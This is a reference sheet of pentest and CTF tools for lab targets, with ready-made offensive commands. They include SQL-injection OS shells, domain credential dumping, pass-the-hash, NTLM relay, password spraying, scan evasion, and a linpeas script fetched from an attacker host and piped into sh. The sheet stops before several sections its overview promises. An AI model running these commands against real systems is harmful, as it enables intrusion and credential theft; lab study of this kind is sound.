# Практический справочник инструментов для CTF, пентеста и HackTheBox

A dense reference for ~50 key tools, grouped by domain. For each: purpose, installation, flag breakdown in English, and practical recipes. The settings target CTF/HTB/pentest labs, where aggressive load is acceptable.

## TL;DR
- This is a reference/documentation: for each tool it gives the purpose, installation, **flag breakdown in English**, and ready-made commands; for web the key tools are `nmap`, `ffuf`, `nuclei`, `sqlmap`; for AD - `netexec` + `impacket` + `bloodhound`/`certipy`; for pwn/RE - `pwntools` + `gdb/pwndbg` + `radare2`.
- Flags are verified against official sources (nmap.org/book, sqlmap wiki, projectdiscovery docs, hashcat, pwntools, volatility3 docs, ly4k/Certipy, ticarpi/jwt_tool). Important defaults: `nmap` scans the top-1000 ports (`-p-` = all 65535), `sqlmap --technique` defaults to `BEUSTQ`, `nuclei -rl` = 150 rps, `-c`/`-bs` = 25.
- The document is neutral toward bug-bounty etiquette: no throttle/anti-ban; settings are chosen for speed in labs.

## Key Findings (how to use the reference)
- Grouping by phase: WEB → NETWORK/AD → PRIVESC → CRACKING → PWN → RE → CRYPTO → FORENSICS/STEGO → EXPLOIT/PIVOT.
- Each flag comes with a short explanation of its meaning, not just listed.
- For projectdiscovery tools (`nuclei`, `httpx`, `katana`) global options come before positional ones; for `volatility3` the global options (`-f`, `-r`, `-o`) go **before** the plugin name.

---

# WEB — разведка и эксплуатация

## 1. nmap — port, service, and NSE scanner
**Purpose:** discovery of hosts, open ports, service versions, OS, and running NSE scripts.
**Install:** `sudo apt install nmap`.

**Scan types:**
- `-sS` - SYN/"half-open" scan (default as root, fast and relatively quiet).
- `-sT` - full TCP connect (when there are no raw sockets, e.g. as an unprivileged user or through proxychains).
- `-sU` - UDP scan (slow; combine with `--top-ports`).
- `-sV` - service version detection by banners/probes.
- `-sC` - run the default set of scripts (equivalent to `--script=default`); considered intrusive.
- `-sn` - host discovery only (ping sweep), no port scanning.
- `-Pn` - skip host discovery, assume the host is alive (mandatory for hosts that block ICMP, typical for HTB).
- `-sA` - ACK scan for mapping firewall rules.

**Port selection and timing:**
- `-p 80,443` / `-p 1-1000` - specific ports/range; `-p-` - **all 65535 ports** (by default nmap scans only top-1000); `-F` - fast, top-100.
- `--top-ports N` - the N most common ports. Per the official Nmap documentation (Port Selection): "By default, Nmap scans the top 1,000 ports... This catches roughly 93% of the TCP ports and 49% of the UDP ports. With the -F (fast) option, only the top 100 ports are scanned, providing 78% TCP effectiveness and 39% for UDP".
- `-T0..-T5` - timing templates: T0 paranoid (IDS-evasion), T3 normal (default), T4 aggressive (recommended for HTB), T5 insane.
- `--min-rate N` / `--max-rate N` - minimum/maximum packets per second (e.g. `--min-rate 5000` for a fast `-p-`).

**Scripts, OS, aggressive mode:**
- `-O` - OS detection by TCP/IP fingerprint.
- `-A` - aggressive mode. Per the official Nmap documentation: "This option enables additional advanced and aggressive options. Presently this enables OS detection (-O), version scanning (-sV), script scanning (-sC) and traceroute (--traceroute)" - with a warning that script scanning is intrusive.
- `--script <name|category>` - run NSE scripts; categories: `default`, `safe`, `vuln`, `auth`, `brute`, `discovery`, `exploit`. Example: `--script "http-*"`, `--script vuln`.
- `--script-args key=val` - arguments to scripts (e.g. `--script-args http.useragent=...`).

**Output:** `-oN` (text), `-oX` (XML), `-oG` (grepable), `-oA basename` (all three at once).

**Firewall bypass:** `-f` (packet fragmentation); `-D RND:10` or `-D decoy1,ME,decoy2` (decoy addresses); `--source-port 53` (spoof the source port, bypass weak ACLs); `-S <IP>` (spoof source IP); `--data-length N` (pad packets).

**Recipes:**
```bash
nmap -sC -sV -oA nmap/initial 10.10.10.10          # standard first HTB scan
nmap -p- --min-rate 5000 -T4 -oA nmap/allports 10.10.10.10   # all ports fast
nmap -p 445 --script "smb-vuln-*" 10.10.10.10      # check SMB vulnerabilities
nmap -sU --top-ports 100 10.10.10.10               # top UDP
nmap -Pn -D RND:5 --source-port 53 10.10.10.10     # evasion
```
**Tip:** first a fast `-p-` to find ports, then a targeted `-sC -sV -p <found>`.

## 2. ffuf — fast web fuzzer (Go)
**Purpose:** brute-force directories/files, vhost discovery, fuzzing of parameters and values.
**Install:** `sudo apt install ffuf` or `go install github.com/ffuf/ffuf/v2@latest`.

**HTTP/input:**
- `-u URL` - target; the keyword `FUZZ` is placed where words should be substituted (URL, header, body).
- `-w path:KEYWORD` - wordlist; you can have several with different keywords (`-w users.txt:U -w pass.txt:P`).
- `-mode clusterbomb` - all combinations of wordlists (Cartesian product); `pitchfork` - in parallel by index; `sniper` - one word per position.
- `-X` - HTTP method (GET/POST/PUT...); `-d` - POST body (`-d 'user=FUZZ&pass=x'`); `-H "Name: Value"` - header (repeatable), also used for vhost: `-H "Host: FUZZ.target"`.
- `-b "NAME=VALUE"` - cookie; `-x http://127.0.0.1:8080` - proxy; `-replay-proxy` - send only matches to the proxy; `-request file` - take a raw HTTP request from a file; `-request-proto https`.

**Matchers (what counts as a "hit"):** `-mc` codes (default 200-299,301,302,307,401,403,405,500; `all` - everything); `-ms` size; `-mw` words; `-ml` lines; `-mr` regexp; `-mt` response time (`>100`); `-mmode and|or`.
**Filters (what to discard):** `-fc` codes; `-fs` size; `-fw` words; `-fl` lines; `-fr` regexp; `-ft` time. `-ac` - auto-calibration (filters out the typical "not found" based on a preset).
**Other:** `-e .php,.txt,.bak` (extensions); `-recursion` + `-recursion-depth N`; `-t 40` (threads); `-rate N` (rps); `-maxtime N`; `-o out -of json|html|md|csv|all`; `-c` (color); `-v` (full URL).

**Recipes:**
```bash
ffuf -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -u http://t/FUZZ -mc all -fc 404
ffuf -w sub.txt -u http://t -H "Host: FUZZ.t" -fs 0          # vhost (filter the size of false ones)
ffuf -w users.txt:U -w pass.txt:P -u http://t/login -X POST -d 'u=U&p=P' -mode clusterbomb -fc 401
ffuf -w params.txt -u 'http://t/api?FUZZ=1' -fw 7            # find parameter names
```
**Gotcha:** when "everything is 200" use `-mc all` + `-fs/-fw` by the size/words of the false responses, or `-ac`.

## 3. feroxbuster — recursive content discovery (Rust)
**Install:** `sudo apt install feroxbuster`.
- `-u URL` (no FUZZ needed - appended to the path); `-w` wordlist (default raft-medium-directories); `-x pdf,js,php` (extensions, can be repeated/comma-separated); `-t` threads; `-d` recursion depth (`-n`/`--no-recursion` to disable, `--force-recursion` to force on); `-s 200,301` (statuses to show), `-C 404` (status filter); `-S`/`--filter-size`, `-W`/`--filter-words`, `--filter-regex`; `-e`/`--extract-links` (pull links out of the body and scan them - hybrid mode); `-r` follow redirects; `-k`/`--insecure` (ignore TLS); `--proxy`/`--burp`; `-o` output, `--json`; `-q`/`--silent` (quiet, for pipes); `--resume-from file.state`; `-a` user-agent; `-T` timeout (default 7s); `--auto-tune`/`--auto-bail`.
```bash
feroxbuster -u http://t -x php,txt,html -d 2 -t 100
cat hosts | feroxbuster --stdin --silent -s 200 301 302 -x js
```

## 4. gobuster — discovery in dir/dns/vhost/fuzz/s3 modes
**Install:** `sudo apt install gobuster`.
- Common: `-w` wordlist; `-t` threads; `-o` output; `-q` quiet; `-k` ignore TLS.
- `dir`: `-u URL`; `-x php,txt` extensions; `-s`/`-b` status whitelist/blacklist; `-c` cookies; `-H` headers; `-r` follow redirects; `-d` discover backup; `--exclude-length N`.
- `dns`: `-d domain`; `-r resolver`; `--wildcard`; `-i` show IP.
- `vhost`: `-u URL`; `--append-domain` (add the base domain to words); `--exclude-length`.
- `fuzz`: `-u` with `FUZZ`.
```bash
gobuster dir -u http://t -w raft-medium-directories.txt -x php,txt -t 50
gobuster dns -d target.htb -w subdomains-top1million-5000.txt -i
gobuster vhost -u http://t --append-domain -w subdomains.txt
```

## 5. dirsearch — discovery (Python)
**Install:** `pipx install dirsearch` or `git clone`.
- `-u URL`; `-e php,asp,aspx,jsp,html,js` extensions (`-e _` no extensions); `-w` wordlist; `-x 403,404` exclude statuses, `-i 200,301` include; `-R N` recursion (`--recursion-depth`); `-t` threads; `--cookie`, `-H`; `--random-agent`; `-o`/`--format`; `-r` follow redirects; `-f` force extensions for all words.
```bash
dirsearch -u http://t -e php,txt,bak -x 404 -t 50 --random-agent
```

## 6. httpx (ProjectDiscovery) — HTTP probing and fingerprinting
**Install:** `go install github.com/projectdiscovery/httpx/cmd/httpx@latest`.
- `-u`/`-l` target/list; `-sc`/`-status-code`; `-title`; `-td`/`-tech-detect` (Wappalyzer); `-server`/`-web-server`; `-cl`/`-content-length`; `-location`; `-ip`/`-cname`; `-favicon` (mmh3 hash of the favicon); `-jarm`; `-mc`/`-fc` match/filter by code; `-ports 80,443,8080`; `-path /admin`; `-x`/`-method`; `-H`; `-json`; `-o`; `-threads`; `-rl` rate; `-probe` (show FAILED/SUCCESS).
```bash
cat hosts.txt | httpx -sc -title -td -ip -favicon
```

## 7. katana (ProjectDiscovery) — crawler
**Install:** `go install github.com/projectdiscovery/katana/cmd/katana@latest`.
- `-u` target; `-d N` depth; `-jc`/`-js-crawl` (parse JS); `-kf`/`-known-files robots,sitemap`; `-headless`/`-hl` (Chromium); `-fs`/`-field-scope`; `-c` concurrency; `-p` parallelism; `-rl` rate; `-o`; `-f`/`-field url,path,...`; `-em`/`-ef` filter by extensions; `-aff` (auto form-fill); `-xhr`.
```bash
katana -u https://t -d 5 -jc -kf all -o urls.txt
```

## 8. gau / waybackurls — historical URLs
- `waybackurls domain` - URLs from the Wayback Machine (via stdin/argument).
- `gau domain` - aggregator (Wayback, Common Crawl, OTX, URLScan): `--threads`; `--subs` (include subdomains); `--blacklist png,jpg,css`; `--fc` status filter; `--from`/`--to YYYYMM`; `--o`.
```bash
gau --subs target.htb | sort -u > urls.txt
echo target.htb | waybackurls > wb.txt
```

## 9. nuclei (ProjectDiscovery) — scanner using YAML templates
**Purpose:** discovery of CVEs/misconfigs via community templates.
**Install:** `go install github.com/projectdiscovery/nuclei/v3/cmd/nuclei@latest`; update templates: `nuclei -ut`.
Per Kali Tools: a hashcat-like ecosystem; nuclei uses a YAML DSL and thousands of community templates.

**Targets/templates:** `-u`/`-target`; `-l list.txt`; `-t templates/` (file/directory); `-tags cve,rce,lfi`; `-id <template-id>`; `-severity critical,high`; `-as`/`-automatic-scan` (Wappalyzer→tags); `-et`/`-exclude-templates`; `-es`/`-exclude-severity`; `-w workflow.yaml`; `-im list|burp|jsonl|openapi|swagger`.
**DAST/fuzzing:** `-dast` (enable fuzzing templates); `-fuzzing-type replace|prefix|postfix|infix`.
**Speed (per official docs):** `-rl` rate-limit (rps, default 150); `-c` concurrency = number of parallel templates (default 25); `-bs`/`-bulk-size` = number of hosts in parallel per template (default 25); `-ss host-spray|template-spray`; `-timeout`; `-retries`.
**Matchers/output:** `-mr`/`-matcher-status`; `-ms`/`-match-condition`; `-validate` (check template syntax); `-jsonl`; `-stats`; `-o`; `-me`/`-markdown-export`; `-se`/`-sarif-export`; `-H` header; `-update-templates`.
```bash
nuclei -u https://t -as -severity critical,high
nuclei -l live.txt -tags cve,exposure -c 50 -rl 500 -stats -o out.txt
nuclei -u https://t -t ./my-template.yaml -validate
```

## 10. sqlmap — SQL injection automation
**Install:** `sudo apt install sqlmap`.
**Target:** `-u URL`; `-r req.txt` (raw HTTP request, convenient from Burp); `-m bulk.txt` (many targets); `-d "mysql://user:pass@host:3306/db"` (direct connection); `-g dork`.
**Data/authentication:** `--data="id=1"`; `--cookie`; `--headers`; `-p param` (test a specific parameter); `--random-agent`; `--csrf-token=token`/`--csrf-url=url`; `--proxy`/`--tor`.
**Detection:** `--level 1..5` (higher = more tests, at ≥2 Cookies are tested, at ≥3 - User-Agent/Referer); `--risk 1..3` (higher = "heavier" payloads, risk to the DB); `--dbms mysql` (hint the DBMS).
**Techniques:** `--technique=BEUSTQ` (per the official wiki: **B** boolean-blind, **E** error-based, **U** union, **S** stacked queries, **T** time-blind, **Q** inline; default `BEUSTQ`). Important: for FS/OS/registry access the string must include `S`. Boolean-blind, per the wiki, extracts each character in at most 7 HTTP requests (bisection).
**WAF bypass:** `--tamper=between,space2comment,randomcase` (scripts in `/usr/share/sqlmap/tamper/`); `--hex`; `--no-cast`.
**Enumeration/dump:** `--dbs`; `--tables -D db`; `--columns -D db -T tbl`; `--dump -D db -T tbl -C col`; `--dump-all`; `--current-user`/`--current-db`/`--is-dba`; `--passwords`.
**Takeover:** `--os-shell` (interactive OS shell); `--sql-shell`; `--file-read`/`--file-write`/`--file-dest`.
**Service:** `--batch` (answer with defaults); `--threads 10`; `--flush-session` (reset cache); `--ignore-code 401`.
```bash
sqlmap -r req.txt -p id --batch --level 3 --risk 2 --dbs
sqlmap -r req.txt -D app -T users --dump --batch
sqlmap -u 'http://t/?id=1' --technique=U --tamper=space2comment --os-shell
```

## 11. ghauri — fast SQLi detector/exploitation
**Install:** `pipx install ghauri` / git.
- `-u`/`-r`; `--data`; `-p`; `--dbs`/`--tables`/`--columns`/`--dump`; `-D/-T/-C`; `--level`; `--technique BEST`; `--dbms`; `--batch`; `--proxy`. Similar to sqlmap, often faster on blind.
```bash
ghauri -u 'http://t/?id=1' --dbs --batch
```

## 12. wpscan — WordPress scanner
**Install:** `sudo apt install wpscan`; token at wpscan.com.
- `--url`; `-e` enumerate with sub-options: `at` (all themes), `ap` (all plugins), `vp` (vuln plugins), `u` (users), `t`; `--plugins-detection passive|aggressive|mixed`; `--api-token TOKEN` (vulnerability database); brute-force: `-U users.txt -P pass.txt` (or `--passwords` + `--usernames`); `--password-attack wp-login|xmlrpc`.
```bash
wpscan --url http://t -e ap,at,u --plugins-detection aggressive --api-token TOKEN
wpscan --url http://t -U admin -P rockyou.txt
```

## 13. arjun / x8 — HTTP parameter discovery
- **arjun:** `-u URL`; `-m GET|POST|JSON|XML` method; `-w wordlist`; `-d delay`; `-t threads`; `--stable`; `-oT/-oJ` output; `--headers`.
- **x8:** `-u URL`; `-w params.txt`; `-X` methods; `-b` body template; `-H` headers; `--output`.
```bash
arjun -u http://t/api -m GET
x8 -u http://t/ -w params.txt -X POST
```

## 14. dalfox — XSS scanner
**Install:** `go install github.com/hahwul/dalfox/v2@latest`.
- Modes: `url <URL>`; `file urls.txt`; `pipe` (from stdin).
- `-b`/`--blind https://collab` (blind XSS); `--waf-evasion`; `--deep-domxss`; `--custom-payload file`; `--skip-bav` (skip basic-other checks); `-H` headers; `-d` data; `--cookie`; `-o` output; `--mining-dict`/`--mining-dom` (parameter discovery).
```bash
dalfox url 'http://t/?q=1' --waf-evasion -b https://x.oast.pro
cat urls.txt | dalfox pipe --skip-bav
```

## 15. commix — OS command injection
**Install:** `sudo apt install commix`.
- `-u URL`; `--data`; `-r req.txt`; `--cookie`; `-p param`; `--technique=classic|eval|time|file|tempfile` (`c|e|t|f`); `--os-cmd=whoami` (a single command); `--os-shell`; `--level 1..3`; `--tamper`; `--random-agent`; `--batch`.
```bash
commix -u 'http://t/ping?ip=127.0.0.1' --os-shell
commix -r req.txt -p ip --technique=t --batch
```

## 16. SSTImap / tplmap — Server-Side Template Injection
- **SSTImap:** `-u URL`; `-d data`; `--cookie`; `-H`; `-e engine` (jinja2, twig, freemarker...); `-O os-shell`; `-S sql`; `--os-cmd`; `-L` list of engines; `-r` raw request.
- **tplmap:** `-u`; `--data`; `--os-shell`; `--os-cmd`; `-e engine`; `--level`.
```bash
sstimap -u 'http://t/?name=John' --os-shell
```

## 17. jwt_tool — JWT analysis and attacks
**Install:** `git clone github.com/ticarpi/jwt_tool`.
Per the official wiki:
- No flags - decode the token. `-T` interactive tamper; `-I` inject/fuzz (`-hc/-hv` header claim/value, `-pc/-pv` payload claim/value).
- `-C -d wordlist` - **crack** the HMAC secret with a wordlist.
- `-X` **exploits:** `a` = alg:none; `n` = null signature; `b` = blank password; `s` = spoof JWKS (with `-ju URL`); `k` = key confusion (RS→HS, with `-pk pub.pem`); `i` = inject inline JWKS.
- `-S` **signing:** `hs256/384/512` (secret `-k`/`-p`), `rs256/...` (private key `-pr`), `ec256/...`, `ps256/...`.
- `-V` verification (with `-pk`); `-M pb|er|at` scan modes (playbook/errors/all-tests); `-t URL -rc "jwt=..."` - send to the application.
```bash
python3 jwt_tool.py <JWT> -C -d rockyou.txt        # crack the secret
python3 jwt_tool.py <JWT> -X a                      # alg:none
python3 jwt_tool.py <JWT> -X k -pk public.pem       # key confusion
```

---

# NETWORK / SERVICES / ACTIVE DIRECTORY

## 18. netexec (nxc, formerly crackmapexec) — multiprotocol "Swiss army knife"
**Install:** `pipx install netexec`.
**Protocols:** `nxc smb|ldap|winrm|mssql|ssh|rdp|ftp|wmi <target>`.
**Authentication:** `-u user`/`-u users.txt`; `-p pass`/`-p pass.txt`; `-H NTHASH` (pass-the-hash); `-k` (Kerberos); `--local-auth` (local, not domain); `-d domain`. Spray: `nxc smb t -u users.txt -p 'Pass1' --no-bruteforce --continue-on-success`. Null/anon: `-u '' -p ''`.
**SMB enumeration:** `--shares`; `--users`; `--groups`; `--local-groups`; `--rid-brute` (RID brute for users without creds); `--sessions`; `--loggedon-users`; `--pass-pol`; `--sam`; `--lsa`; `--ntds` (dump NTDS.dit via DRSUAPI; `--ntds vss` via a shadow copy).
**Command execution:** `-x 'whoami'` (cmd); `-X '$PSVersionTable'` (PowerShell); `--exec-method smbexec|wmiexec|atexec`.
**Modules:** `-L` list; `-M lsassy` (dump LSASS), `-M spider_plus` (recursive share traversal, `-o READ_ONLY=false` to download), `-M gpp_password`, `-M zerologon`, `-M nopac`, `-M petitpotam`.
**LDAP:** `--query "(filter)" attrs`; `--trusted-for-delegation`; `--password-not-required`; `--admin-count`; `--gmsa`; `-M daclread`.
```bash
nxc smb 10.10.10.10                                  # basic fingerprint
nxc smb dc -u u -p p --shares --users --pass-pol
nxc smb dc -u u -p p --ntds                          # dump domain hashes
nxc smb 10.10.10.0/24 -u u -H NTHASH --local-auth    # PtH across the subnet
nxc winrm t -u u -p p -x whoami
```

## 19. impacket — a set of Python scripts for Windows protocols
**Install:** `pipx install impacket` (binaries `impacket-<tool>`).
General target format: `domain/user:password@host` (+ `-hashes LM:NT` for PtH, `-k -no-pass` for Kerberos, `-dc-ip`).

- **secretsdump.py** - dump secrets: SAM/LSA/NTDS. `impacket-secretsdump dom/u:p@host`; `-just-dc` (domain only via DRSUAPI/DCSync); `-just-dc-ntlm`; `-just-dc-user krbtgt`; `-sam SAM -system SYSTEM -security SECURITY LOCAL` (offline from hives); `-outputfile`.
- **GetUserSPNs.py** - Kerberoasting. `-request` (get TGS hashes), `-outputfile`, `-dc-ip`; `-stealth` (no SPN filter in the LDAP query). Feed to hashcat `-m 13100`.
- **GetNPUsers.py** - AS-REP roasting. `-request`; `-usersfile users.txt`; `-format hashcat|john`; `-no-pass`; `-dc-ip`. Feed to hashcat `-m 18200`. Without `-request` - only shows the vulnerable ones (preauth disabled).
- **psexec.py / smbexec.py / wmiexec.py / dcomexec.py / atexec.py** - remote execution. psexec - service via ADMIN$ (noisy, needs admin); wmiexec - semi-interactive via DCOM/135 (quieter); smbexec - via a bat file/service; atexec - via the scheduler; dcomexec - via `-object MMC20|ShellWindows|ShellBrowserWindow`.
- **ntlmrelayx.py** - NTLM relay (needs SMB signing off). `-t smb://host`/`-tf targets.txt`; `-smb2support`; `--no-http-server`; `-c 'command'`; `-socks` (SOCKS proxy for relayed sessions); `-i` (interactive); `--escalate-user`.
- **GetADUsers.py** - list of domain users (`-all`). **lookupsid.py** - SID→users brute. **mssqlclient.py** - MSSQL client (`-windows-auth`, then `enable_xp_cmdshell`). **ticketer.py** - generate golden/silver TGT/TGS (`-nthash`, `-domain-sid`, `-domain`, `-spn`). **getTGT.py** - request a TGT (overpass-the-hash), saves a ccache (`export KRB5CCNAME=...`). **getST.py** - Service Ticket with `-impersonate` (S4U).
```bash
impacket-secretsdump dom/u:p@dc -just-dc
impacket-GetUserSPNs dom/u:p -request -dc-ip 10.10.10.10
impacket-GetNPUsers dom/ -usersfile u.txt -no-pass -format hashcat -dc-ip 10.10.10.10
impacket-wmiexec dom/u@host -hashes :NTHASH
impacket-ntlmrelayx -tf targets -smb2support -c 'powershell -enc ...'
```

## 20. enum4linux-ng — SMB/RPC/LDAP enumeration
**Install:** `pipx install enum4linux-ng` / git.
- `-A` (everything); `-U` users; `-G` groups; `-S` shares; `-P` pass-policy; `-o` OS; `-u/-p` creds; `-oY/-oJ` output YAML/JSON; `-R` rid-cycling.
```bash
enum4linux-ng -A 10.10.10.10
```

## 21. smbclient / smbmap — working with SMB shares
- **smbclient:** `-L //host` (list shares); `//host/share`; `-U 'dom\user%pass'`; `-N` (null/no password); `--pw-nt-hash` (PtH); `-c 'ls;get file'` (commands). Inside: `ls, cd, get, put, mget`.
- **smbmap:** `-H host`; `-u/-p/-d`; `-H` + `-R` (recursive listing); `--download path`; `--upload`; `-x 'command'`; `-r share`.
```bash
smbclient -L //10.10.10.10 -N
smbmap -H 10.10.10.10 -u u -p p -R
```

## 22. rpcclient — MS-RPC client
**Install:** `sudo apt install samba`.
- `-U 'user%pass'` / `-N`; `rpcclient -U "" -N <host>` (null session).
- Useful commands: `enumdomusers`, `enumdomgroups`, `queryuser <rid>`, `querygroup`, `lookupnames <name>`, `lookupsids <sid>`, `querydominfo`, `getdompwinfo`, `createdomuser`, `setuserinfo`.
```bash
rpcclient -U "" -N 10.10.10.10 -c "enumdomusers"
```

## 23. ldapsearch — LDAP/AD queries
- `-x` (simple bind); `-H ldap://host` (URI); `-D 'dom\user'` (bind DN); `-w pass` (`-W` prompt for password); `-b "DC=dom,DC=htb"` (base DN); `-s sub|base|one` (scope); `-o ldif_wrap=no` (no line wrapping). Anonymous bind: only `-x -H -b`.
```bash
ldapsearch -x -H ldap://10.10.10.10 -b "DC=dom,DC=htb"   # anonymously
ldapsearch -x -H ldap://dc -D 'dom\u' -w p -b "DC=dom,DC=htb" '(samaccountname=svc*)'
```

## 24. kerbrute — Kerberos pre-auth brute (Go)
**Install:** download the binary from ropnop/kerbrute.
- Commands: `userenum` (valid users, does **not** increment badPwd → no lockout), `passwordspray`, `bruteuser`, `bruteforce` (combos from a file/stdin).
- Flags: `-d domain`; `--dc IP`; `-t threads` (default 10); `-o` log; `-v` (log failures); `--safe` (stop on lockout); `--delay`; `--downgrade` (RC4). For AS-REP-roastable users it saves the hashes (`--hash-file`).
```bash
kerbrute userenum -d dom.htb --dc 10.10.10.10 users.txt -o valid.txt
kerbrute passwordspray -d dom.htb --dc 10.10.10.10 valid.txt 'Winter2026!'
```
**Warning:** `passwordspray`/`bruteuser` increment badPwd and can lock out accounts - account for the pass-policy.

## 25. responder — LLMNR/NBT-NS/mDNS poisoning
**Install:** `sudo apt install responder`.
- `-I eth0` (interface, required); `-w` (rogue WPAD proxy); `-v` (verbose); `-A` (analyze - listen only, do not poison); `-F`/`-P` (force WPAD/Proxy auth); `-dwv`. Captured NetNTLMv2 → hashcat `-m 5600`. Config at `/etc/responder/Responder.conf`.
```bash
sudo responder -I tun0 -wv
sudo responder -I tun0 -A          # passive analysis
```

## 26. evil-winrm — WinRM shell
**Install:** `gem install evil-winrm`.
- `-i IP`; `-u user`; `-p pass`; `-H NTHASH` (PtH); `-s /scripts/` (PS1 directory for `Invoke-`); `-e /exes/` (exe directory for `Invoke-Binary`); `-S` (SSL/5986); `-c`/`-k` (cert auth). In the session: `upload`, `download`, `menu`.
```bash
evil-winrm -i 10.10.10.10 -u admin -H 32196b56ffe6f45e294117b91a83bf38
```

## 27. bloodhound / bloodhound-python — AD attack graph
- **bloodhound-python** (collector from Linux): `-u user -p pass -d dom -c All -ns <DC-IP>` (`-c` methods: All/DCOnly/Session/ACL...); `--zip`; `-dc dc.dom`; `-k` Kerberos.
- **SharpHound** (from Windows): `-c All`, `--zip`. Import the zip into the BloodHound GUI; query with pre-built queries (Shortest path to DA, etc.).
```bash
bloodhound-python -u u -p p -d dom.htb -c All -ns 10.10.10.10 --zip
```

## 28. certipy — AD CS attacks (ESC1–ESC16)
**Install:** `pipx install certipy-ad`.
**Commands:** `find` (enumerate CA/templates/vulnerabilities), `req` (request a certificate), `auth` (PKINIT/"pass-the-cert" → TGT + NTLM), `relay` (ESC8/ESC11), `ca` (CA management, `-add-officer`), `template` (`-write-default-configuration` makes a template ESC1-vulnerable), `shadow` (Shadow Credentials), `forge` (Golden Certificate).
- `find`: `-u user@dom -p pass -dc-ip IP`; `-vulnerable`; `-enabled`; `-stdout`/`-old-bloodhound`; `-hide-admins`.
- `req`: `-u -p -dc-ip`; `-target CA.dom` (CA DNS); `-ca 'CORP-CA'`; `-template ESC1`; `-upn administrator@dom` and/or `-dns`; `-sid`. Saves a `.pfx`.
- `auth`: `-pfx admin.pfx -dc-ip IP` → TGT and/or NT hash.
```bash
certipy find -u u@dom -p p -dc-ip 10.10.10.10 -vulnerable -enabled
certipy req -u u@dom -p p -dc-ip 10.10.10.10 -target CA.dom -ca CORP-CA -template ESC1 -upn administrator@dom
certipy auth -pfx administrator.pfx -dc-ip 10.10.10.10
```

## 30. hydra — online brute-force
**Install:** `sudo apt install hydra`.
- `-l user`/`-L users.txt`; `-p pass`/`-P pass.txt`; `-C combo.txt` (user:pass); `-t N` (threads, default 16); `-f` (stop at the first success on a host, `-F` for `-M`); `-s port`; `-S` (SSL); `-V`/`-vV` (show attempts); `-M targets.txt`; `-e nsr` (n=empty, s=login as password, r=reverse).
- **http-post-form / http-get-form:** syntax `"path:body:fail_or_success"`, where `^USER^`/`^PASS^` are the substitutions, `F=error_string` or `S=success_string/code`. Modules: `ssh`, `ftp`, `smb`, `rdp`, `mysql`, `http-head` (basic auth).
```bash
hydra -l admin -P rockyou.txt 10.10.10.10 ssh -t 4
hydra -L u.txt -P p.txt 10.10.10.10 http-post-form "/login:user=^USER^&pass=^PASS^:F=Invalid" -V
hydra -l admin -P rockyou.txt -f 10.10.10.10 http-get-form "/admin/:user=^USER^&pass=^PASS^:S=302"
```

---

# PRIVILEGE ESCALATION (enum)

## 31. linpeas / winpeas — automatic privilege-escalation enumeration
- **linpeas.sh** (Linux): `./linpeas.sh`; `-a` (all checks); `-s` (stealth/superfast, fewer); `-e` (extended); colored output (🔴/🟡 = high interest). Run without writing to disk: `curl http://attacker/linpeas.sh | sh`.
- **winPEAS** (Windows): `winPEASx64.exe`; modules `systeminfo`, `userinfo`, `servicesinfo`, `applicationsinfo`; `quiet`; `log`. There is a `.bat` version.
```bash
curl 10.10.14.1/linpeas.sh | sh
```

## 32. pspy — process monitoring without root
**Install:** download `pspy64`.
- `-p` (monitor processes), `-f` (file events), `-i N` (interval in ms), `-r dir` (recursively watch directories). Catches cron jobs and commands from root.
```bash
./pspy64 -pf -i 1000
```

## 33. GTFOBins / LOLBAS — references for binary abuse
- **GTFOBins** (Linux): how a legitimate binary gives shell/read/write/SUID/sudo. Workflow: `sudo -l` (what is allowed), `find / -perm -4000 2>/dev/null` (SUID), `getcap -r / 2>/dev/null` (capabilities) → check the findings on GTFOBins.
- **LOLBAS** (Windows): legitimate binaries (certutil, mshta, regsvr32) for download/execution.
```bash
sudo -l
find / -perm -4000 -type f 2>/dev/null
getcap -r / 2>/dev/null
```

## 34. linux-exploit-suggester / windows-exploit-suggester
- **les.sh** (Linux): matches the kernel version against public exploits; `--kernel <ver>`; `--uname`.
- **wesng / windows-exploit-suggester** (Windows): takes `systeminfo` as input → a list of missing patches/CVEs. `wes.py systeminfo.txt`.
```bash
./linux-exploit-suggester.sh
python wes.py systeminfo.txt
```

---

# КРЕКИНГ ПАРОЛЕЙ

## 35. hashcat — GPU cracker
**Install:** `sudo apt install hashcat`. Per Kali Tools - supports 7 attack modes and 300+ algorithms (v7.x).
**Attack modes (`-a`):** `0` straight (wordlist); `1` combinator (two wordlists); `3` mask/brute; `6` hybrid wordlist+mask; `7` hybrid mask+wordlist.
**Masks:** `?l` a-z, `?u` A-Z, `?d` 0-9, `?s` special characters, `?a` everything printable, `?h`/`?H` hex, `?b` byte. Example: `?u?l?l?l?l?d?d`.
**Key `-m` (hash-mode):** 0 MD5; 100 SHA1; 1400 SHA256; 1700 SHA512; 1800 sha512crypt ($6$); 500 md5crypt ($1$); 3200 bcrypt ($2*$); 1000 NTLM; 3000 LM; 5500 NetNTLMv1; 5600 NetNTLMv2; 13100 Kerberoast (TGS-REP); 18200 AS-REP; 2100 DCC2; 22000 WPA-PBKDF2-PMKID+EAPOL; 16500 JWT (HS); 13400 KeePass; 9600 Office2013; 10500 PDF; 10000 Django(PBKDF2-SHA256); 7500 Kerberos AS-REQ.
**Other:** `-r rules/best64.rule` (mutation rules); `-O` (optimized kernel, limits password length); `-w 1..4` (workload, 3-4 for a dedicated machine); `--force` (ignore warnings); `--show` (show cracked); `-o cracked.txt`; `-d 1` (GPU); `--restore`.
**Rule syntax:** `c`=capitalize, `l`/`u`=case, `$X`=append X at the end, `^X`=at the start, `sXY`=substitution.
```bash
hashcat -m 1000 ntlm.txt rockyou.txt -r rules/best64.rule
hashcat -m 13100 kerb.txt rockyou.txt -O -w 3
hashcat -m 18200 asrep.txt rockyou.txt
hashcat -m 22000 wifi.22000 -a 3 ?d?d?d?d?d?d?d?d
hashcat -m 1000 ntlm.txt --show
```

## 36. john (John the Ripper) — CPU cracker + *2john
**Install:** `sudo apt install john`.
- `--wordlist=rockyou.txt`; `--rules` (or `--rules=Jumbo`); `--format=NT|krb5tgs|raw-md5|sha512crypt` (`--list=formats`); `--show hash.txt` (cracked); `--incremental` (brute-force via a Markov model); `--mask=?l?l?l?d`; `--fork=4`; `--session=name`/`--restore`.
- **Helpers *2john** (create a hash for john/hashcat): `zip2john file.zip`, `rar2john`, `ssh2john id_rsa`, `pdf2john`, `office2john`, `keepass2john file.kdbx`, `7z2john`.
```bash
zip2john secret.zip > h.txt; john --wordlist=rockyou.txt h.txt; john --show h.txt
